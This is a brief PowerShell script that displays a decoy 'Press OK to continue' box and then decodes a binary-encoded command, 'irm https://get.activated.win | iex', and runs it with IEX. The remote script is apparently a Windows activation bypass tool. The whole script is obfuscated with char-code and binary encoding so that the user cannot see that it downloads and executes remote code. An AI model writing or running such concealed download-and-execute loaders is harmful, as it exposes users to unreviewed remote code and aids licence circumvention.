# DON'T CHANGE/EDIT THIS CODE!!!

Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
    ([string]::Join('',
        [char]80, [char]114, [char]101, [char]115, [char]115, [char]32, [char]79, [char]75, [char]32, [char]116, [char]111,
        [char]32, [char]99, [char]111, [char]110, [char]116, [char]105, [char]110, [char]117, [char]101, [char]32, [char]38,
        [char]32, [char]112, [char]108, [char]101, [char]97, [char]115, [char]101, [char]32, [char]119, [char]97, [char]105,
        [char]116, [char]32, [char]46, [char]46, [char]46
    )),
    ([string]::Join('',
        [char]77, [char]111, [char]100, [char]105, [char]102, [char]105, [char]101, [char]100, [char]32, [char]98, [char]121,
        [char]32, [char]77, [char]117, [char]104, [char]97, [char]109, [char]109, [char]97, [char]100, [char]32, [char]82,
        [char]105, [char]122, [char]107, [char]105, [char]32, [char]40, [char]114, [char]101, [char]122, [char]116, [char]100,
        [char]101, [char]118, [char]41
    )),
    ([string]::Join('', [char]79, [char]75)),
    ([string]::Join('', [char]73, [char]110, [char]102, [char]111, [char]114, [char]109, [char]97, [char]116, [char]105, [char]111, [char]110))
)

function C {
    param ([string]$e)
    $b = $e -split ' '
    $d = $b | ForEach-Object { [Convert]::ToByte($_, 2) }
    [System.Text.Encoding]::UTF8.GetString($d)
}

$e = ([string]::Join(' ', 1101001, 1110010, 1101101, 100000, 1101000, 1110100, 1110100, 1110000, 1110011, 111010, 101111, 101111, 1100111, 1100101, 1110100, 101110, 1100001, 1100011, 1110100, 1101001, 1110110, 1100001, 1110100, 1100101, 1100100, 101110, 1110111, 1101001, 1101110, 100000, 1111100, 100000, 1101001, 1100101, 1111000))
$d = C -e $e
IEX $d
